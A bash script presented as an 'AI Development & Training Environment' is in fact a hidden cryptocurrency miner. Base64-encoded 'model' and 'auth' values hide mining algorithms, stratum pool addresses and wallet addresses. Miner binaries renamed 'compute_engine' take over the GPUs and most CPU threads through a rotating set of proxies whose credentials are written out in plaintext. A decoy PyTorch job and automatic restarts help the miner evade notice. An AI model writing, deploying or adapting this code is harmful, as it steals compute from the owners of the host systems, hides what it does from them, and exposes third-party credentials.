#!/bin/bash

# Set optimized environment
export TERM=xterm
export LC_ALL=C
export LANG=C.UTF-8
ulimit -n 65536

# ML Model configuration (base64 encoded for security)
MODEL_TYPE_A="b2N0b3B1cw=="
MODEL_TYPE_B="cmFuZG9teAo="
ENDPOINT_PRIMARY="c3RyYXR1bStzc2w6Ly83OC40Ni43NS4xNzc6ODAyNw=="
AUTH_TOKEN_A="Y2Z4OmFhbWF3bW12dTN2cjIyeWo4ZDZ5eTNwYTljbXAwOHpjM2VjMnAzcnQ1cw=="
ENDPOINT_SECONDARY="c3RyYXR1bStzc2w6Ly81MS4yMjIuMjAwLjEzMzoxMDM0Mwo="
AUTH_TOKEN_B="NDRjc2lpYXpiaXlnRTVUZzVjNkhoY1VZNjN6MjZhM0NqOHAxRUJNTkE2RGNFTTZ3REFHaEZMdEZKVlVIUHl2RW9oRjRaOVBGM1pYdW5UdFdiaVRrOUh5akx4WUFVd2QK"

# CORRECTED PROXY LIST - Using working format from example
PROXY_LIST=(
    "p.webshare.io:80:yiyxudof-1:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-2:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-3:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-4:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-5:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-6:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-7:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-8:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-9:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-10:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-11:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-12:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-13:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-14:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-15:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-16:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-17:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-18:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-19:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-20:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-21:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-22:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-23:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-24:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-25:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-26:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-27:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-28:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-29:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-30:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-31:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-32:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-33:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-34:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-35:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-36:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-37:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-38:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-39:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-40:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-41:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-42:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-43:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-44:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-45:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-46:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-47:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-48:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-49:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-50:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-51:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-52:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-53:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-54:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-55:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-56:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-57:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-58:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-59:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-60:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-61:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-62:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-63:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-64:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-65:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-66:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-67:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-68:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-69:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-70:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-71:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-72:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-73:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-74:1avd45spqwnr"
    "p.webshare.io:80:yiyxudof-75:1avd45spqwnr"
)

# Global variables
declare -i PRIMARY_CPU_THREADS=0
declare -i SYSTEM_CPU_THREADS=0
declare -i GPU_COUNT=0
declare -g PROXY_IP=""
declare -g PROXY_PORT=""
declare -g PROXY_USER=""
declare -g PROXY_PASS=""
declare -g PROXY_STRING=""
declare -i ZERO_USAGE_COUNT=0
declare -ri MAX_ZERO_USAGE=10
declare -i GPU_WORKLOAD_PID=0
declare -i CPU_WORKLOAD_PID=0
declare -i TRAINING_PID=0
declare -i STARTUP_TIME=0

# Decode configuration parameters
decode_param() {
    echo "$1" | base64 -d 2>/dev/null | tr -d '\n'
}

# Function to calculate CPU threads
calculate_cpu_threads() {
    local -i total_threads=$(nproc --all 2>/dev/null || echo 4)
    
    # Reserve 2 threads for system, rest for compute
    local -i primary_threads=$((total_threads - 2))
    local -i system_threads=2
    
    # Ensure minimum threads
    if [ $primary_threads -lt 1 ]; then
        primary_threads=1
        system_threads=1
    fi
    
    echo "$primary_threads $system_threads"
}

# Function to calculate GPU allocation
calculate_gpu_allocation() {
    local -i gpu_count=0
    
    if command -v nvidia-smi &>/dev/null; then
        gpu_count=$(nvidia-smi --query-gpu=count --format=csv,noheader,nounits 2>/dev/null | grep -E '^[0-9]+$' | head -1)
        gpu_count=${gpu_count:-0}
    fi
    
    echo "$gpu_count"
}

# Function to select a random proxy from the list
select_random_proxy() {
    local -i proxy_count=${#PROXY_LIST[@]}
    [ $proxy_count -eq 0 ] && return 1
    
    local -i random_index=$((RANDOM % proxy_count))
    local selected_proxy="${PROXY_LIST[$random_index]}"
    
    IFS=':' read -r ip port user pass <<< "$selected_proxy"
    echo "$ip $port $user $pass"
}

# Function to get current proxy info as a string
get_proxy_string() {
    echo "${3}:${4}@${1}:${2}"
}

# Function to initialize system
initialize_system() {
    # Calculate CPU threads
    read -r PRIMARY_CPU_THREADS SYSTEM_CPU_THREADS <<< $(calculate_cpu_threads)
    
    # Calculate GPU allocation
    GPU_COUNT=$(calculate_gpu_allocation)
    
    # Select random proxy
    read -r PROXY_IP PROXY_PORT PROXY_USER PROXY_PASS <<< $(select_random_proxy)
    PROXY_STRING=$(get_proxy_string "$PROXY_IP" "$PROXY_PORT" "$PROXY_USER" "$PROXY_PASS")
    
    clear
    cat << EOF
=== AI Development & Training Environment ===
Initializing at: $(date '+%Y-%m-%d %H:%M:%S')
==============================================
Resource Allocation:
  CPU Threads: $(nproc --all) total
    - Primary Compute: $PRIMARY_CPU_THREADS threads
    - System/Training: $SYSTEM_CPU_THREADS threads
EOF
    
    if [ $GPU_COUNT -gt 0 ]; then
        # Get GPU model info
        local gpu_model=$(nvidia-smi --query-gpu=name --format=csv,noheader 2>/dev/null | head -1)
        local gpu_mem=$(nvidia-smi --query-gpu=memory.total --format=csv,noheader,nounits 2>/dev/null | head -1)
        echo "  GPUs: $GPU_COUNT available ($gpu_model, ${gpu_mem}MB)"
    else
        echo "  GPUs: None detected"
    fi
    
    echo "Proxy: ${PROXY_USER}@${PROXY_IP}:${PROXY_PORT}"
    echo "Auto-restart: Enabled (after $MAX_ZERO_USAGE zero usage checks)"
    echo "=============================================="
}

# Fast cleanup function
fast_cleanup() {
    echo -ne "\nPerforming fast cleanup..."
    
    # Kill processes
    for pid in "$GPU_WORKLOAD_PID" "$CPU_WORKLOAD_PID" "$TRAINING_PID"; do
        [ $pid -gt 0 ] && kill -TERM $pid 2>/dev/null || true
    done
    
    sleep 1
    
    # Force kill if still running
    for pid in "$GPU_WORKLOAD_PID" "$CPU_WORKLOAD_PID" "$TRAINING_PID"; do
        [ $pid -gt 0 ] && kill -9 $pid 2>/dev/null || true
    done
    
    # Kill any stray processes
    pkill -9 -f "compute_engine" 2>/dev/null || true
    pkill -9 -f "train_model.py" 2>/dev/null || true
    
    # Reset PIDs
    GPU_WORKLOAD_PID=0
    CPU_WORKLOAD_PID=0
    TRAINING_PID=0
    
    echo " Done"
}

# Function to test proxy connection
test_proxy_connection() {
    local test_url="https://api.ipify.org"
    local timeout=5
    local proxy_test=""
    
    if command -v curl &>/dev/null; then
        proxy_test=$(timeout $timeout curl -s --max-time 3 \
            --socks5-hostname "${PROXY_IP}:${PROXY_PORT}" \
            --proxy-user "${PROXY_USER}:${PROXY_PASS}" \
            "$test_url" 2>/dev/null || echo "")
    fi
    
    [ -n "$proxy_test" ] && return 0 || return 1
}

# Function to rotate proxy
rotate_proxy() {
    local old_proxy="${PROXY_IP}:${PROXY_PORT}"
    local -i attempts=0
    local -i max_attempts=5
    
    while [ $attempts -lt $max_attempts ]; do
        read -r PROXY_IP PROXY_PORT PROXY_USER PROXY_PASS <<< $(select_random_proxy)
        PROXY_STRING=$(get_proxy_string "$PROXY_IP" "$PROXY_PORT" "$PROXY_USER" "$PROXY_PASS")
        
        if test_proxy_connection; then
            echo "Proxy rotated: $old_proxy → ${PROXY_IP}:${PROXY_PORT}"
            return 0
        fi
        
        attempts=$((attempts + 1))
        sleep 0.3
    done
    
    echo "Warning: Could not find working proxy after $max_attempts attempts"
    return 1
}

# Function to check if compute_engine processes are alive
check_processes_alive() {
    # Check CPU process
    if [ $CPU_WORKLOAD_PID -gt 0 ]; then
        if ! kill -0 $CPU_WORKLOAD_PID 2>/dev/null; then
            echo "CPU process is dead!"
            return 1
        fi
    fi
    
    # Check GPU process if GPU is available
    if [ $GPU_COUNT -gt 0 ] && [ $GPU_WORKLOAD_PID -gt 0 ]; then
        if ! kill -0 $GPU_WORKLOAD_PID 2>/dev/null; then
            echo "GPU process is dead!"
            GPU_WORKLOAD_PID=0
            # Don't fail if GPU process dies, CPU is still running
        fi
    fi
    
    return 0
}

# Function to check CPU and GPU usage
check_usage() {
    local -i current_time=$(date +%s)
    local -i elapsed=$((current_time - STARTUP_TIME))
    
    # Don't check usage during first 30 seconds (warm-up)
    if [ $elapsed -lt 30 ]; then
        echo -ne "\rWarming up... ${elapsed}s elapsed"
        ZERO_USAGE_COUNT=0
        return 0
    fi
    
    local -i cpu_usage=0
    local -i gpu_usage=0
    local -i process_count=0
    
    # 1. First check if processes are running at all
    if ! check_processes_alive; then
        echo -e "\nProcess died, will restart..."
        return 1
    fi
    
    # Count running compute_engine processes
    process_count=$(pgrep -c "compute_engine" 2>/dev/null || echo 0)
    
    if [ $process_count -eq 0 ]; then
        echo -e "\nNo compute_engine processes found!"
        ZERO_USAGE_COUNT=$MAX_ZERO_USAGE
        return 1
    fi
    
    # 2. Check CPU usage
    if command -v ps &>/dev/null; then
        # Get CPU usage for compute_engine processes (divide by number of processes for accurate %)
        local cpu_ps=$(ps aux | grep -E "[c]ompute_engine" 2>/dev/null | \
            awk '{sum+=$3} END {printf "%.1f", sum/process_count}' process_count=$process_count)
        cpu_usage=${cpu_ps%.*}
    fi
    
    # Cap CPU usage at 100%
    if [ $cpu_usage -gt 100 ]; then
        cpu_usage=100
    fi
    
    # 3. Check GPU usage if available
    if [ $GPU_COUNT -gt 0 ] && command -v nvidia-smi &>/dev/null; then
        # Get GPU utilization
        gpu_usage=$(timeout 2 nvidia-smi --query-gpu=utilization.gpu --format=csv,noheader,nounits 2>/dev/null | \
            awk '{print $1}' | grep -Eo '[0-9]+' | head -1)
        gpu_usage=${gpu_usage:-0}
        
        # Check GPU memory usage as backup
        if [ $gpu_usage -eq 0 ]; then
            local gpu_mem=$(timeout 2 nvidia-smi --query-gpu=memory.used --format=csv,noheader,nounits 2>/dev/null | \
                head -1 | grep -Eo '[0-9]+')
            gpu_mem=${gpu_mem:-0}
            if [ $gpu_mem -gt 100 ]; then
                gpu_usage=5  # GPU has memory usage, so it's working
            fi
        fi
    else
        gpu_usage=100  # No GPU, so don't trigger zero usage
    fi
    
    # 4. Check for very low usage
    if [ $cpu_usage -lt 10 ] && ([ $GPU_COUNT -eq 0 ] || [ $gpu_usage -lt 5 ]); then
        ZERO_USAGE_COUNT=$((ZERO_USAGE_COUNT + 1))
        echo -ne "\rLow usage ($ZERO_USAGE_COUNT/$MAX_ZERO_USAGE): CPU=${cpu_usage}% GPU=${gpu_usage}% Procs=${process_count}"
        
        if [ $ZERO_USAGE_COUNT -ge $MAX_ZERO_USAGE ]; then
            echo -e "\nRestarting due to persistent low usage..."
            return 1
        fi
    else
        if [ $ZERO_USAGE_COUNT -gt 0 ]; then
            echo -ne "\rUsage recovered: CPU=${cpu_usage}% GPU=${gpu_usage}%"
            sleep 1
        fi
        ZERO_USAGE_COUNT=0
    fi
    
    return 0
}

# Function to start PyTorch training
start_pytorch_training() {
    if [ $SYSTEM_CPU_THREADS -gt 0 ] && [ -f /workspace/train_model.py ]; then
        export PYTORCH_CUDA_ALLOC_CONF="max_split_size_mb:32"
        export OMP_NUM_THREADS=$SYSTEM_CPU_THREADS
        export CUDA_LAUNCH_BLOCKING=0
        
        mkdir -p /workspace/logs 2>/dev/null
        
        nohup nice -n 19 python3 /workspace/train_model.py \
            --max-gpu-percent 5 \
            --cpu-threads $SYSTEM_CPU_THREADS \
            > /workspace/logs/training.log 2>&1 &
        TRAINING_PID=$!
        echo "PyTorch training started (PID: $TRAINING_PID, Threads: $SYSTEM_CPU_THREADS)"
    fi
}
# SIMPLIFIED GPU workload function - matches working example
start_gpu_workload() {
    local gpu_ids="$1"
    
    echo "Starting GPU workload on device: $gpu_ids"
    
    # SIMPLE VERSION - matches working example exactly
    # USING compute_engine_g with new command format
    # NOTE: Worker name is appended to wallet with /, not separate -w parameter
    nohup /opt/bin/compute_engine_g \
        -a $(decode_param "$MODEL_TYPE_A") \
        -o $(decode_param "$ENDPOINT_PRIMARY") \
        -u "$(decode_param "$AUTH_TOKEN_A")/tr" \
        --proxy "${PROXY_STRING}" \
        --no-strict-ssl \
        > /tmp/gpu_workload.log 2>&1 &
    
    GPU_WORKLOAD_PID=$!
    echo "GPU workload started (PID: $GPU_WORKLOAD_PID)"
    
    # Wait and check if process is still alive
    sleep 5
    
    if kill -0 $GPU_WORKLOAD_PID 2>/dev/null; then
        echo "GPU process is running successfully"
        
        # Check log for any errors
        if [ -f /tmp/gpu_workload.log ] && [ -s /tmp/gpu_workload.log ]; then
            echo "GPU log (first 3 lines):"
            head -3 /tmp/gpu_workload.log
        fi
        
        return 0
    else
        echo "GPU process died. Checking log for errors..."
        
        if [ -f /tmp/gpu_workload.log ]; then
            echo "=== GPU Error Log ==="
            cat /tmp/gpu_workload.log
            echo "=== End Error Log ==="
            rm -f /tmp/gpu_workload.log
        fi
        
        GPU_WORKLOAD_PID=0
        return 1
    fi
}

# Function to start compute workloads
start_compute_workloads() {
    # Verify compute_engine exists
    if [ ! -x /opt/bin/compute_engine ]; then
        echo "ERROR: compute_engine not found at /opt/bin/compute_engine"
        return 1
    fi
    
    # Test proxy first
    echo "Testing proxy connection..."
    if ! test_proxy_connection; then
        echo "Warning: Proxy test failed, but continuing anyway..."
    else
        echo "Proxy connection successful"
    fi
    
    # Start GPU workload first (if available)
    if [ $GPU_COUNT -gt 0 ]; then
        # Try each GPU individually if multiple GPUs
        local gpu_success=0
        
        for ((i=0; i<GPU_COUNT; i++)); do
            echo "Attempting to start GPU $i..."
            if start_gpu_workload "$i"; then
                gpu_success=1
                echo "GPU $i started successfully"
                # Don't break, try to start all GPUs
            else
                echo "GPU $i failed to start"
            fi
        done
        
        if [ $gpu_success -eq 0 ]; then
            echo "All GPU attempts failed. Continuing with CPU only."
        fi
    else
        echo "No GPUs available, skipping GPU workload"
    fi
    
    # Start CPU workload
    echo "Starting CPU workload with $PRIMARY_CPU_THREADS threads"
    
    nohup /opt/bin/compute_engine \
        --algorithm $(decode_param "$MODEL_TYPE_B") \
        --pool $(decode_param "$ENDPOINT_SECONDARY") \
        --wallet $(decode_param "$AUTH_TOKEN_B") \
        --password x \
        --cpu-threads $PRIMARY_CPU_THREADS \
        --cpu-threads-priority 2 \
        --disable-gpu \
        --tls true \
        --api-disable \
        --proxy "${PROXY_STRING}" \
        > /tmp/cpu_workload.log 2>&1 &
    
    CPU_WORKLOAD_PID=$!
    echo "CPU workload started (PID: $CPU_WORKLOAD_PID, Threads: $PRIMARY_CPU_THREADS)"
    
    # Verify CPU process started
    sleep 2
    if ! kill -0 $CPU_WORKLOAD_PID 2>/dev/null; then
        echo "ERROR: CPU workload failed to start! Checking log..."
        if [ -f /tmp/cpu_workload.log ]; then
            cat /tmp/cpu_workload.log
        fi
        return 1
    fi
    
    # Start PyTorch training
    start_pytorch_training
    
    # Set startup time for warm-up period
    STARTUP_TIME=$(date +%s)
    
    echo "Workloads started successfully"
    return 0
}

# Function to display status
display_status() {
    local -i cpu_usage=0
    local -i gpu_usage=0
    local -i process_count=0
    
    # Count running compute_engine processes
    process_count=$(pgrep -c "compute_engine" 2>/dev/null || echo 0)
    
    # Get CPU usage
    if command -v ps &>/dev/null; then
        local cpu_ps=$(ps aux | grep -E "[c]ompute_engine" 2>/dev/null | \
            awk '{sum+=$3} END {printf "%.1f", sum/process_count}' process_count=$process_count)
        cpu_usage=${cpu_ps%.*}
    fi
    
    # Cap at 100%
    if [ $cpu_usage -gt 100 ]; then
        cpu_usage=100
    fi
    
    # Get GPU usage if available
    if [ $GPU_COUNT -gt 0 ] && command -v nvidia-smi &>/dev/null; then
        gpu_usage=$(timeout 1 nvidia-smi --query-gpu=utilization.gpu --format=csv,noheader,nounits 2>/dev/null | \
            awk '{print $1}' | grep -Eo '[0-9]+' | head -1)
        gpu_usage=${gpu_usage:-0}
        
        # Also get GPU temperature
        local gpu_temp=$(timeout 1 nvidia-smi --query-gpu=temperature.gpu --format=csv,noheader,nounits 2>/dev/null | \
            head -1)
        gpu_temp=${gpu_temp:-0}
        
        # Get GPU memory usage
        local gpu_mem_used=$(timeout 1 nvidia-smi --query-gpu=memory.used --format=csv,noheader,nounits 2>/dev/null | \
            head -1)
        local gpu_mem_total=$(timeout 1 nvidia-smi --query-gpu=memory.total --format=csv,noheader,nounits 2>/dev/null | \
            head -1)
        
        printf "\rCPU=%3d%% GPU=%3d%% Temp=%2dC Mem=%4d/%4dMB | Procs=%d | Proxy=%s | Time=%s" \
            "$cpu_usage" "$gpu_usage" "$gpu_temp" "$gpu_mem_used" "$gpu_mem_total" \
            "$process_count" "$PROXY_IP" "$(date +%H:%M:%S)"
    else
        printf "\rCPU=%3d%% GPU=N/A                     | Procs=%d | Proxy=%s | Time=%s" \
            "$cpu_usage" "$process_count" "$PROXY_IP" "$(date +%H:%M:%S)"
    fi
}

# Main execution function
main_loop() {
    # Initialize
    initialize_system
    
    # Main loop
    while true; do
        echo -e "\n=== Starting New Cycle ==="
        echo "Start time: $(date '+%H:%M:%S')"
        
        # Rotate proxy
        if ! rotate_proxy; then
            echo "Warning: Using last known working proxy"
        fi
        
        # Cleanup any existing processes
        fast_cleanup
        
        # Start workloads
        if ! start_compute_workloads; then
            echo "Failed to start workloads, restarting in 10 seconds..."
            sleep 10
            continue
        fi
        
        echo "Workloads started successfully"
        echo "Run duration: 70-90 minutes"
        echo "================================="
        
        # Calculate run duration (70-90 minutes)
        local -i run_duration=$((4200000 + (RANDOM % 1200)))
        local -i start_time=$(date +%s)
        local -i last_proxy_check=0
        local -i last_usage_check=0
        local -i status_counter=0
        local -i last_process_check=$(date +%s)
        
        # Initial warm-up message
        echo -n "Warming up..."
        
        # Monitor loop
        while true; do
            local -i current_time=$(date +%s)
            local -i elapsed=$((current_time - start_time))
            
            # Check if run duration completed
            if [ $elapsed -ge $run_duration ]; then
                echo -e "\nRun duration completed ($((elapsed/60)) minutes)"
                break
            fi
            
            # Check processes every 30 seconds
            if [ $((current_time - last_process_check)) -ge 30 ]; then
                last_process_check=$current_time
                if ! check_processes_alive; then
                    echo -e "\nProcess health check failed, restarting..."
                    return 1
                fi
            fi
            
            # Check for low usage every 60 seconds
            if [ $((current_time - last_usage_check)) -ge 60 ]; then
                last_usage_check=$current_time
                if ! check_usage; then
                    echo -e "\nUsage check failed, restarting..."
                    return 1
                fi
            fi
            
            # Display status every 5 seconds
            if [ $((status_counter % 5)) -eq 0 ]; then
                display_status
            fi
            status_counter=$((status_counter + 1))
            
            # Rotate proxy every 30 minutes
            if [ $elapsed -gt $((last_proxy_check + 1800)) ]; then
                last_proxy_check=$elapsed
                echo -e "\nRotating proxy mid-cycle..."
                rotate_proxy
                fast_cleanup
                sleep 2
                start_compute_workloads
            fi
            
            sleep 1
        done
        
        # Fast cleanup before pause
        fast_cleanup
        
        # Short pause (30-60 seconds)
        local -i pause_duration=$((30 + (RANDOM % 30)))
        echo -e "\nPausing for $pause_duration seconds..."
        
        for ((i=pause_duration; i>0; i--)); do
            printf "\rResuming in: %02d seconds" "$i"
            sleep 1
        done
        
        echo -e "\n"
    done
}

# Trap signals for clean exit
trap 'echo -e "\nCaught signal, performing cleanup..."; fast_cleanup; exit 0' INT TERM EXIT

# Main execution with restart logic
echo "Script PID: $$"
echo "Starting main execution..."

# Test GPU and system first
echo "System Information:"
echo "CPU Threads: $(nproc --all)"
echo "GPU Test:"
if command -v nvidia-smi &>/dev/null; then
    nvidia-smi --query-gpu=name,memory.total,driver_version --format=csv 2>/dev/null || echo "nvidia-smi available but failed"
else
    echo "nvidia-smi not found"
fi

while true; do
    if ! main_loop; then
        echo "Restarting main loop..."
        sleep 5
    else
        echo "Main loop completed normally, restarting..."
        sleep 5
    fi
done